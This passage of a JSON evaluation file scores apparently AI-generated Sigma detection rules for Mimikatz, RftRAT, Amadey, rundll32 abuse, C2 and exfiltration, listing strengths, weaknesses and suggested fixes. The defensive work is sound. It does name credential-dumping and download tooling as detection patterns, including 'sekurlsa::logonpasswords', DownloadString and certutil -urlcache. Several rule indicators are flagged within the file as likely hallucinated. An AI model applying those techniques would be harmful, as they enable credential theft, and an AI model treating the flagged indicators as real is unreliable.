          "Include network or file activity post-execution to improve confidence in detection"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.8,
          "efficiency": 0.9,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "RftRAT Process Hollowing Detection",
        "rule_id": "3a1692ca-2cfb-4cf3-85d2-d00e0ea7fb26",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known process hollowing indicators such as suspended process creation, memory manipulation, and thread resumption",
          "Uses specific command-line artifacts and image paths associated with malicious behavior",
          "Covers multiple potential parent processes commonly abused in living-off-the-land attacks",
          "Includes relevant false positives in metadata, showing awareness of operational impact",
          "Well-structured Sigma format with clear detection logic and tagging"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 rule effectiveness is unproven",
          "Detection coverage must be scored low due to lack of verification (CRITICAL requirement)",
          "Relies on command-line arguments containing exact strings like 'RftRAT', which can be easily obfuscated",
          "Potential for false positives from legitimate admin tools using similar PowerShell patterns",
          "Rule may miss variants that use different process names or techniques for hollowing"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability against actual RftRAT or process hollowing samples",
          "Enhance detection logic with additional indicators such as EventID 8 (CreateRemoteThread) or hollowing-specific Sysmon events",
          "Add process GUID or command-line entropy analysis to reduce obfuscation bypass risk",
          "Consider using Sigma correlation rules across multiple events instead of single-event detection",
          "Improve TTP alignment by referencing valid MITRE ATT&CK ID (e.g., T1055.012) instead of 'unknown'"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Mimikatz Process Execution Detected",
        "rule_id": "0722aef6-06df-4817-9596-f75b416b5a69",
        "quality_score": 0.7,
        "status": "pass",
        "strengths": [
          "Simple and focused detection logic targeting a known malicious binary",
          "Uses Sysmon process creation logs, which are reliable for detecting executable execution",
          "Includes relevant MITRE ATT&CK tags for context and correlation",
          "Efficient condition with a single, clear field match"
        ],
        "weaknesses": [
          "Detection coverage is limited due to lack of real-world verification",
          "Rule only matches exact file name, making it easy to evade via renaming or obfuscation",
          "No verification performed \u2014 rule effectiveness in real environment is unknown",
          "Relies solely on 'mimikatz.exe' filename, which is not always used in attacks"
        ],
        "suggestions": [
          "Add additional detection logic using command-line arguments, parent-child process anomalies, or known Mimikatz-related strings",
          "Include file hash indicators or known malicious paths to improve detection fidelity",
          "Perform real-world testing or simulation to verify detection capability",
          "Consider using behavioral indicators (e.g., LSASS memory access) instead of or in addition to filename matching"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.8,
          "efficiency": 0.9,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "C2 Server Communication via Suspicious Process",
        "rule_id": "7848f6a4-c18e-455e-811b-4799694bf3e5",
        "quality_score": 0.575,
        "status": "fail",
        "strengths": [
          "The rule targets known suspicious processes commonly abused in C2 activity, such as cmd.exe, powershell.exe, and mshta.exe.",
          "It leverages Sysmon network connection logs, which provide detailed visibility into process-level network activity.",
          "The rule is mapped to MITRE ATT&CK techniques (T1071, T1571), aiding in threat context and alignment with adversary behavior.",
          "The inclusion of documented false positives helps analysts assess alert legitimacy."
        ],
        "weaknesses": [
          "The detection logic is overly broad\u2014matching any network connection from the listed processes without filtering on destination reputation or connection patterns, increasing noise.",
          "No real-world verification was performed, so effectiveness against actual C2 behavior is unproven.",
          "The rule matches on any DestinationIp (\"*\"), which lacks specificity and may generate high-volume alerts for benign traffic.",
          "There are no indicators of compromise (IOCs) or suspicious domains/IPs tied to the TTP, suggesting potential hallucination or generic construction without threat intel grounding.",
          "The TTP information is incomplete (missing ID and tactic), weakening confidence in alignment."
        ],
        "suggestions": [
          "Constrain the DestinationIp condition to known-bad or suspicious IPs/domains from threat intelligence feeds.",
          "Add additional filters such as connection frequency, rare external destinations, or use of non-standard ports to reduce false positives.",
          "Incorporate DNS request data or JA3/S fingerprints to improve C2 detection accuracy.",
          "Perform real-world testing or simulation to verify detection capability and tune the rule accordingly.",
          "Enhance the rule with additional context such as command-line arguments or parent-child process relationships to increase specificity."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Remote Desktop Protocol Usage via RDP Wrapper",
        "rule_id": "da190372-d711-48b6-9654-57aa86e0ac5c",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets specific artifacts associated with RDP Wrapper, such as file paths and configuration tools, which increases specificity.",
          "Includes relevant process creation monitoring via Sysmon, which is a strong data source for detecting lateral movement.",
          "Condition logic combines multiple detection paths (RDP Wrapper files and suspicious port usage), improving breadth.",
          "Well-documented false positives, acknowledging legitimate administrative use and development scenarios."
        ],
        "weaknesses": [
          "No real-world verification was performed, so detection efficacy is unproven \u2014 this directly impacts confidence in coverage.",
          "Relies on command-line arguments containing '3389', which could miss obfuscated or non-standard syntax (e.g., hex-encoded ports).",
          "ParentImage checks for svchost.exe and lsass.exe may be too broad and not directly indicative of malicious RDP Wrapper use.",
          "No mention of network connection events or other corroborating behaviors that could strengthen detection."
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to validate detection capability and tune the rule based on observed behavior.",
          "Enhance detection logic with additional indicators such as loaded modules (e.g., rdpwrap.dll injection), registry modifications, or service installations associated with RDP Wrapper.",
          "Consider adding network-based detection (e.g., Event ID 3 in Sysmon) to capture outbound/inbound connections on port 3389 from non-standard processes.",
          "Refine parent process conditions with more specific image paths or known malicious execution chains if available.",
          "Include metadata such as user context or session type (e.g., local vs. remote session) to reduce false positives."
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "PowerShell Activity Detected via NLP Pattern Matching",
        "rule_id": "909389df-4e4c-4ac0-9464-f35034c2e280",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Covers common malicious PowerShell command-line patterns such as encoded commands and common malicious cmdlets (e.g., IEX, DownloadString)",
          "Uses Sysmon process creation data, which is reliable for command-line monitoring",
          "Includes relevant MITRE ATT&CK tagging for execution via PowerShell (T1059.001)",
          "Acknowledges legitimate administrative use cases in false positives list, showing awareness of operational impact"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 rule effectiveness is unproven in practice",
          "High potential for false positives due to broad CommandLine keyword matching without contextual constraints",
          "Rule generated via 'langchain' (AI/LLM), increasing risk of hallucinated logic or overfitting to training data",
          "Lacks process ancestry or user context (e.g., parent process, user account) to distinguish suspicious from normal activity",
          "No thresholding or frequency-based detection, increasing alert fatigue risk"
        ],
        "suggestions": [
          "Conduct real-world testing using red team or emulation data to validate detection capability",
          "Refine detection logic with additional context such as parent process (e.g., wmi, ssh), user (SYSTEM vs admin), or command length/entropy",
          "Implement statistical scoring or thresholding (e.g., count of suspicious arguments) instead of binary match",
          "Add field validation (e.g., CommandLine length > 100) to reduce noise from benign short scripts",
          "Replace AI-generated rules with human-reviewed logic to reduce hallucination risk and improve reliability"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Amadey File and Directory Discovery Targeting South Korean Product Names",
        "rule_id": "63a236d8-cc30-46f9-b2b9-9421d1c34deb",
        "quality_score": 0.55,
        "status": "fail",
        "strengths": [
          "Targets relevant process creation events via Sysmon for Windows",
          "Covers multiple command-line tools commonly abused for discovery (cmd, PowerShell, wscript, etc.)",
          "Includes multiple command-line indicators for file/directory enumeration across shells",
          "Tags align with MITRE ATT&CK (T1083) and malware family (Amadey)",
          "Acknowledges legitimate administrative activity in false positives"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection efficacy is unproven",
          "High potential for false positives due to broad command-line keywords (e.g., 'dir', 'ls')",
          "Lacks specificity to South Korean product names despite rule title and tagging",
          "Contains redundant entries in CommandLine|contains (e.g., 'dir', 'ls' listed twice)",
          "No constraints on target directories or filenames related to South Korean software",
          "Relies on generic indicators that may be used in non-malicious scripts"
        ],
        "suggestions": [
          "Add specific indicators of South Korean product names in file or directory paths (e.g., 'Samsung', 'Naver', 'Krafton') to align with title and targeting claim",
          "Narrow CommandLine conditions using regex or full command patterns to reduce false positives",
          "Include event correlation or frequency thresholds to distinguish malicious sweeps from isolated admin use",
          "Conduct real-world testing or simulation to verify detection capability",
          "Remove duplicate entries in detection keywords",
          "Consider adding Image condition to exclude known trusted administrative tools or paths"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.6,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Suspicious Rundll32 Execution via Uncommon Parameters",
        "rule_id": "d44fb879-7838-4256-a96f-c694804013c1",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known malicious behaviors such as script loading and encoded command execution via rundll32.exe",
          "Multiple detection conditions (script load, WMI/debug, encoded commands, network use) increase breadth of coverage",
          "Well-documented false positives help analysts understand expected noise",
          "Uses precise field targeting (Image, CommandLine) with appropriate operators (endswith, contains)",
          "Aligned with MITRE ATT&CK technique T1218.011 (Rundll32) for defensive evasion"
        ],
        "weaknesses": [
          "No real-world verification performed, so effectiveness is unproven",
          "Detection coverage score reduced due to lack of verification (CRITICAL: no events detected implies low confidence)",
          "Some CommandLine keywords like 'http', 'https', '\\\\' in selection_network may trigger on benign network paths or shares",
          "Possibility of false positives from administrative or installer use cases despite listed FP examples",
          "Rule may miss obfuscated or base64-encoded payloads that avoid simple string matches"
        ],
        "suggestions": [
          "Perform real-world testing with known adversary emulation scenarios involving rundll32 abuse",
          "Add exclusions for common benign rundll32 invocations (e.g., standard System32 paths, known Microsoft-signed binaries)",
          "Enhance detection logic with regex patterns to better identify encoded or obfuscated commands",
          "Consider adding process command line length thresholds or entropy checks to flag obfuscation",
          "Validate and update the TTP ID and tactic field to reflect accurate MITRE ATT&CK mapping"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Amadey System Information Discovery via Command Line",
        "rule_id": "32699665-201c-463f-8c23-75c66ea7735a",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Covers multiple command-line tools commonly abused during system information discovery",
          "Targets relevant process creation events with Sysmon for high-fidelity logging",
          "Includes specific command-line indicators tied to discovery techniques",
          "Well-documented false positives to guide analysts",
          "Aligned with MITRE ATT&CK techniques (T1087, T1012)"
        ],
        "weaknesses": [
          "No real-world verification performed, so effectiveness against actual Amadey activity is unproven",
          "Broad command-line keywords (e.g., 'wmic', 'systeminfo') may miss obfuscated or encoded commands",
          "High potential for false positives due to legitimate admin use of listed commands",
          "Rule does not include parent-child process context (e.g., cmd spawned by malicious process)",
          "Contains '/all' as a standalone keyword which is overly generic and may trigger on benign usage"
        ],
        "suggestions": [
          "Conduct real-world testing with Amadey samples to validate detection capability",
          "Add process ancestry or parent process conditions to reduce false positives",
          "Use regex or case-insensitive matching to catch obfuscated command lines",
          "Exclude or refine generic terms like '/all' unless used in specific context",
          "Consider adding network connection correlation to increase confidence in malicious intent"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "RftRAT File and Directory Discovery via Specific Path Names",
        "rule_id": "59a628f6-1001-4344-8f81-fac20ba91785",
        "quality_score": 0.7,
        "status": "pass",
        "strengths": [
          "The rule targets known suspicious execution methods (cmd, PowerShell, wscript, etc.) commonly abused by malware",
          "The use of a unique UUID string in the command line (A1CCA2EC-C09F-D33C-4317-7F71F0E2A976_0) likely reduces false positives",
          "The rule is aligned with MITRE ATT&CK technique T1083 (File and Directory Discovery)",
          "Log source is specific and appropriate (Sysmon process creation on Windows)",
          "Detection logic is simple and efficient"
        ],
        "weaknesses": [
          "No real-world verification was performed, so detection efficacy is unproven",
          "The UUID string appears to be arbitrarily generated and not tied to any known RftRAT sample or public report (potential hallucination)",
          "Relies solely on a single hardcoded string, making it easily bypassed by minor malware modifications",
          "The TTP ID is listed as 'unknown' and lacks tactic context, reducing traceability",
          "Rule may not cover all variants of RftRAT or similar behaviors"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to verify detection capability",
          "Validate the UUID string against known RftRAT samples or threat intelligence; remove if unverified",
          "Enhance detection logic with additional indicators (e.g., file creation events, network callbacks, or other behavioral patterns)",
          "Consider using additional Sigma conditions (e.g., parent-child process anomalies) to improve robustness",
          "Add context from MITRE ATT&CK (e.g., correct tactic: 'Discovery') and ensure TTP alignment is accurate",
          "Include fallback detection patterns to increase coverage and resilience to obfuscation"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.8,
          "efficiency": 0.9,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Mimikatz Execution for Credential Theft",
        "rule_id": "1e71a483-4cca-470e-a45f-bdac4c323aea",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known indicators of Mimikatz execution, such as the executable name and specific command-line arguments like 'sekurlsa::logonpasswords', which are strongly associated with credential dumping",
          "Detection logic is straightforward and leverages Sysmon process creation logs, which are commonly available and reliable for this type of detection",
          "Includes relevant MITRE ATT&CK tags (T1003 - Credential Access), improving threat context and alignment with adversary behavior",
          "Acknowledges potential false positives in the 'falsepositives' field, showing awareness of operational impact"
        ],
        "weaknesses": [
          "Detection coverage is limited due to lack of real-world verification; without confirmation the rule works in practice, confidence is low",
          "Relies solely on exact string matching (e.g., 'mimikatz.exe' and 'sekurlsa::logonpasswords'), making it easy to bypass via obfuscation, renaming, or alternative command syntax",
          "No verification run performed, so effectiveness in a real environment is unknown \u2014 this increases risk of undetected gaps",
          "Rule does not account for common Mimikatz variants (e.g., memory-only execution, renamed binaries, or PowerShell-based loaders)"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify the rule detects actual Mimikatz activity and refine based on results",
          "Enhance detection logic to include additional Mimikatz indicators, such as other command-line modules (e.g., 'sekurlsa::tickets', 'privilege::debug') or parent-child process anomalies",
          "Improve robustness by using case-insensitive matching and regex patterns to catch obfuscated command lines",
          "Add file hash monitoring or signed/unsigned executable checks to detect renamed Mimikatz binaries",
          "Include network indicators if available, or correlate with other behaviors such as LSASS access (event ID 10 with Sysmon) to increase detection confidence"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Keylogger Detection via Process Creation",
        "rule_id": "a94f1fd1-7b8f-4be7-828f-5ebb471ff6f2",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets relevant command-line indicators associated with keylogging activity",
          "Uses Sysmon process creation logs, which are effective for detecting suspicious process behavior",
          "Includes reasonable false positive exclusions in the metadata",
          "Rule is focused on Windows systems with clear log source definition"
        ],
        "weaknesses": [
          "No real-world verification was performed, so effectiveness against actual keylogger techniques is unproven",
          "Detection logic relies solely on exact string matches which may miss obfuscated or novel variants",
          "Potential for false positives due to legitimate tools using 'keylog' in names or arguments",
          "Lacks additional context such as parent-child process relationships or network indicators",
          "Rule does not include known adversary tools or hashes for enhanced detection"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability",
          "Expand detection logic to include regular expressions for obfuscation (e.g., 'k3yl0g', 'key.*log')",
          "Add exclusions for known legitimate software that may trigger the rule",
          "Incorporate additional behavioral indicators such as file creation in startup directories or registry modifications",
          "Enrich the rule with threat intel feeds or known malicious hashes if available",
          "Consider using Sigma's named conditions to separate command-line and image path detections for better tuning"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "RftRAT C&C Communication and Command Results",
        "rule_id": "1b5c2c48-4085-442e-aaf3-975093d6b9c1",
        "quality_score": 0.55,
        "status": "fail",
        "strengths": [
          "The rule targets process creation events with Sysmon, which is a reliable source for detecting suspicious command-line activity",
          "Focuses on cmd.exe writing to AppData, which can be indicative of data exfiltration or command output saving by malware",
          "Includes relevant MITRE ATT&CK tagging (T1082 - System Information Discovery) for better threat context",
          "Condition logic is simple and efficient, reducing computational overhead in detection engine"
        ],
        "weaknesses": [
          "No real-world verification was performed, so effectiveness against actual RftRAT behavior is unproven",
          "Rule lacks specificity: many legitimate scripts and applications write to AppData using cmd.exe and echo, increasing false positives",
          "No use of additional indicators such as specific file names, command patterns, or parent processes that would strengthen detection",
          "Rule was likely generated hallucinatorily via 'langchain' method without empirical validation",
          "No TTP ID or tactic provided in the target TTP, reducing confidence in alignment"
        ],
        "suggestions": [
          "Conduct real-world testing with RftRAT samples to validate detection capability",
          "Improve specificity by adding conditions: e.g., specific command-line patterns (like 'echo ... > ...'), known file names, or suspicious parent processes (e.g., mshta, wscript)",
          "Add file path exclusions or known-good baselines to reduce false positives",
          "Include network indicators (if available) to correlate with C2 communication",
          "Replace 'langchain' generation method with manual rule development or threat intelligence-based derivation",
          "Ensure all TTP metadata (ID, tactic) is filled in for proper categorization"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.6,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "AutoIt Script Execution for Malicious Purposes",
        "rule_id": "9fe70e44-cbd2-44c6-b174-daba6c227a07",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known AutoIt executables (autoit3.exe, AutoIt3_x64.exe), which are directly associated with the AutoIt scripting engine",
          "Includes relevant command-line arguments commonly used in malicious AutoIt execution (e.g., /ErrorStdOut, .au3, .a3x)",
          "Aligned with MITRE ATT&CK technique T1059 (Command and Scripting Interpreter)",
          "Specifies false positives, showing awareness of legitimate use cases",
          "Uses Sysmon process creation logs, which provide rich telemetry for detection"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 rule effectiveness is unproven in practice",
          "Detection coverage score reduced due to lack of verification (per critical rule: unverified = score < 5)",
          "Potential for false positives due to legitimate administrative or development use of AutoIt",
          "Rule may miss obfuscated command lines or alternate execution methods (e.g., embedded scripts in other processes)"
        ],
        "suggestions": [
          "Perform real-world testing or simulation to verify detection capability",
          "Enhance detection logic with additional context such as parent process, user context, or command-line patterns indicative of evasion",
          "Consider adding file hash monitoring or signed/unsigned binary checks to reduce false positives",
          "Include network indicators or child process behavior if available to increase confidence",
          "Update TTP ID if known; currently listed as 'unknown'"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "RftRAT Injection into svchost.exe",
        "rule_id": "c8290f50-ad48-40ed-92dd-b4c6ee21cd4c",
        "quality_score": 0.675,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and suspicious behavior (RftRAT in command line with svchost.exe), which aligns with known malicious patterns.",
          "Uses precise field conditions (Image ending with svchost.exe and CommandLine containing RftRAT), reducing ambiguity.",
          "Includes relevant MITRE ATT&CK tags (attack.T1055 - Process Injection), aiding in threat context.",
          "Acknowledges potential false positives and documents them, supporting analyst triage."
        ],
        "weaknesses": [
          "Detection coverage is low due to lack of real-world verification; rule may not detect actual RftRAT activity as intended.",
          "Relies solely on exact string match 'RftRAT' in command line, which is easily evaded via obfuscation or misspelling.",
          "No verification was performed, so effectiveness in real environments is unproven.",
          "The TTP ID is listed as 'unknown' and tactic is missing, reducing traceability to MITRE framework."
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to verify detection capability and refine logic.",
          "Enhance detection logic with regex or broader indicators (e.g., anomalous svchost command-line arguments) to reduce evasion risk.",
          "Add additional context such as parent process anomalies or network connections to improve reliability.",
          "Populate missing TTP ID and tactic (e.g., Execution or Defense Evasion) for better alignment with MITRE ATT&CK.",
          "Consider using sigma rule testing frameworks like sigmac or SigmaScan to validate rule performance across log sources."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.8,
          "efficiency": 0.9,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Create or Modify System Process via NLP Pattern Matching",
        "rule_id": "17721dcf-5c83-463e-803b-d2aacbbdd306",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known suspicious parent processes like svchost.exe and wininit.exe, which are commonly abused for persistence",
          "Covers multiple execution methods (cmd, PowerShell, wscript, etc.) and command-line indicators such as /c, -EncodedCommand, and CreateProcess",
          "Includes detection logic for suspicious script and DLL loading via rundll32, regsvr32, mshta, and wmic",
          "Well-documented false positives, showing awareness of operational environment noise",
          "Uses Sysmon process creation logs, which provide rich telemetry for this TTP"
        ],
        "weaknesses": [
          "No real-world verification was performed, so detection efficacy is unproven",
          "Relies on NLP pattern matching (as per title), but no actual NLP or ML components are evident in the rule logic",
          "Rule may generate false positives due to legitimate administrative use of command-line tools from system binaries",
          "Does not include network indicators or file hash lookups that could improve specificity",
          "The TTP ID is listed as 'unknown' and lacks MITRE ATT&CK mapping completeness"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to validate detection capability against the target TTP",
          "Add context enrichment such as user context, image file paths, or digital signature checks to reduce false positives",
          "Include exceptions for known legitimate tools or signed binaries where applicable",
          "Improve MITRE ATT&CK mapping by specifying valid technique IDs (e.g., T1037, T1053 for Create or Modify System Process)",
          "Consider adding time-based aggregation or behavioral chains (e.g., follow-on activity) to increase confidence in alerts"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detected Process Injection via NLP Pattern Matching",
        "rule_id": "5009d9ce-d0de-4c64-9c85-99d44ef8a0fb",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Covers multiple behavioral indicators of process injection",
          "Uses known suspicious image paths and command-line patterns",
          "Includes parent-child process anomaly detection",
          "Well-documented false positives to guide tuning",
          "Leverages Sysmon process creation data effectively"
        ],
        "weaknesses": [
          "No real-world verification performed, so detection efficacy is unproven",
          "High potential for false positives due to broad command-line keywords like 'Load', 'Invoke', 'http'",
          "Relies on NLP-style pattern matching which may not reflect actual malicious behavior",
          "No correlation with process ancestry depth or user context",
          "Rule may miss modern obfuscation techniques"
        ],
        "suggestions": [
          "Conduct real-world testing using emulated process injection techniques to validate detection",
          "Narrow command-line keywords with context (e.g., base64 + certutil, or -enc + powershell)",
          "Add constraints on parent process legitimacy (e.g., explorer.exe spawning regsvr32 with network call)",
          "Include entropy checks or base64 decoding heuristics in command line",
          "Supplement with image load or API call logs for higher-fidelity detection"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Infostealer Creation by RftRAT",
        "rule_id": "1ad9dd96-ef7e-4654-a821-769e7eaed40b",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets relevant process creation events with specific command-line indicators associated with data staging",
          "The use of Sysmon process creation logs is appropriate for detecting this type of activity",
          "The inclusion of multiple scripting interpreters (cmd, PowerShell, wscript, etc.) increases applicability across execution methods",
          "False positives are reasonably considered and documented"
        ],
        "weaknesses": [
          "No real-world verification was performed, so detection efficacy is unproven",
          "The command-line arguments (e.g., '--stage', '-encode') may be generic and not uniquely tied to RftRAT",
          "No specific IOCs (e.g., filenames, hashes, domains) from known RftRAT samples are included, increasing risk of hallucination",
          "The TTP ID is marked as 'unknown' and tactic is missing, reducing alignment with MITRE ATT&CK",
          "The rule was generated via 'langchain', suggesting potential synthetic or unvalidated logic"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to verify detection capability against actual RftRAT behavior",
          "Refine selection criteria with specific command-line patterns or artifacts observed in confirmed RftRAT samples",
          "Add constraints such as parent-child process relationships or image paths to reduce false positives",
          "Incorporate known file names or script paths used by RftRAT during data staging",
          "Update tags and metadata to include full MITRE ATT&CK mapping (e.g., T1074.001 if applicable)",
          "Consider adding a time-based condition or threshold to reduce noise if used in high-volume environments"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "VMP Packed RftRAT Obfuscation",
        "rule_id": "ea5a7a6f-70f6-48a7-ae07-0ea93cbdf11f",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Simple and focused detection logic based on a clear indicator (\"VMP\" in command line)",
          "Aligned with MITRE ATT&CK technique T1027 (Obfuscated Files or Information)",
          "Includes relevant tags for categorization and correlation",
          "Efficient condition using a single contains operator, which is performant in most SIEMs"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection capability is unproven",
          "Detection logic relies solely on presence of \"VMP\" string, which may not be present in actual RftRAT VMP-packed samples",
          "Risk of false negatives due to overly specific and potentially guessable indicator",
          "Lacks additional context (e.g., parent process, image path, arguments) to strengthen detection",
          "Rule was generated by 'langchain' \u2014 potential for hallucinated logic or assumptions"
        ],
        "suggestions": [
          "Conduct real-world testing with known VMP-packed RftRAT samples to validate detection",
          "Enrich detection logic with additional indicators (e.g., suspicious parent processes, unusual command-line length, obfuscated arguments)",
          "Add process image path conditions to reduce false positives (e.g., exclude known dev tools)",
          "Include file creation or network activity follow-up rules for corroboration",
          "Replace generic 'VMP' string match with specific, observed artifacts from actual malware analysis"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.9,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "RftRAT File Deletion via Command Line",
        "rule_id": "ecd70220-0a29-4f4d-b4b2-bc00c77e10a4",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "The rule targets known command-line indicators associated with file deletion behavior",
          "It covers multiple execution paths (cmd.exe and powershell.exe)",
          "The inclusion of false positives in metadata shows awareness of operational impact",
          "Relevant MITRE ATT&CK tagging enhances context and alignment with threat models"
        ],
        "weaknesses": [
          "The rule relies on '0x06' and 'delete' in command lines, which are not specific to RftRAT or file deletion TTPs and may not reflect real-world behavior",
          "No real-world verification was performed, so detection efficacy is unproven",
          "The use of '0x06' as an indicator appears arbitrary and potentially hallucinated, as it has no documented link to RftRAT or file deletion tactics",
          "The selection_any_process_hex condition is overly broad, matching any process with 'delete' in the command line, leading to high false positives",
          "The TTP ID is listed as 'unknown' and lacks tactic context, reducing its utility for threat-informed detection"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to validate detection logic against actual RftRAT samples",
          "Replace or augment '0x06' with known IoCs or behavioral patterns from verified RftRAT samples",
          "Refine the 'delete' keyword condition with additional constraints (e.g. specific tools, arguments, or parent-child process chains) to reduce false positives",
          "Add process ancestry or argument structure checks (e.g. wildcards, recursive flags) to increase specificity",
          "Update metadata with accurate MITRE ATT&CK tactic and technique ID based on confirmed TTPs",
          "Remove or justify the use of '0x06' \u2014 if not grounded in sample analysis, it should be discarded as a likely hallucination"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.6,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Application Layer Protocol Activity via NLP Pattern Matching",
        "rule_id": "ff75047f-eb96-488c-8977-385821cf303e",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Covers multiple common command-line tools used in C2 activities (cmd, powershell, certutil, bitsadmin, curl, wget)",
          "Uses behavioral indicators such as command-line arguments (-enc, /c, -urlcache, AddJob)",
          "Targets known TTPs associated with Application Layer Protocol abuse (T1071)",
          "Includes relevant false positives in metadata, showing awareness of operational impact",
          "Well-structured detection logic with clear condition grouping"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection effectiveness is unproven",
          "Detection coverage score reduced due to lack of verification (per critical rule)",
          "Relies on command-line patterns that may be easily obfuscated (e.g., encoded commands, alternative syntax)",
          "No use of NLP as described in the title and description \u2014 misleading naming",
          "Potential for false positives due to legitimate use of tools like certutil and bitsadmin in patch management"
        ],
        "suggestions": [
          "Perform real-world testing or emulation to verify detection capability and tune logic",
          "Add process ancestry or user context to reduce false positives (e.g., parent process not explorer.exe)",
          "Include additional indicators such as network connections or file creation post-download",
          "Rename rule to remove 'NLP Pattern Matching' since no NLP logic is implemented",
          "Consider adding exclusions for known administrative scripts or signed processes"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exfiltration Over C2 Channel Detected via NLP Pattern Matching",
        "rule_id": "d0c3b6d6-ef9c-402f-a4d1-b8451b2e8116",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule covers multiple common tools and techniques associated with data exfiltration over C2 channels, such as PowerShell with encoded commands, certutil, bitsadmin, and net use",
          "The use of Sysmon process creation logs provides detailed visibility into command-line activity",
          "The rule is well-structured with clear selection criteria for each tool",
          "The false positives are reasonably documented, acknowledging legitimate administrative use"
        ],
        "weaknesses": [
          "The rule lacks real-world verification, which introduces uncertainty about its actual effectiveness in detecting the intended TTP",
          "The detection logic is broad and may miss nuanced or obfuscated variants of exfiltration (e.g., alternative tools like curl, wget, or custom malware)",
